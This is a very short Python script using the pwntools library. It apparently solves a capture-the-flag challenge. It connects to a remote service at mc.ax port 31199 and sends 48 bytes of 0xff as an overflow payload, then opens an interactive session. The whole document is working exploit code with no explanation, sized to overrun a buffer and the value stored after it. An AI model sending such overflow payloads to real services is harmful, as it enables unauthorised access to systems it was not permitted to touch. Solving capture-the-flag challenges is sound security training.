from pwn import *

io = remote('mc.ax', '31199')
io.sendline(b'\xff' * (40 + 8))
io.interactive()
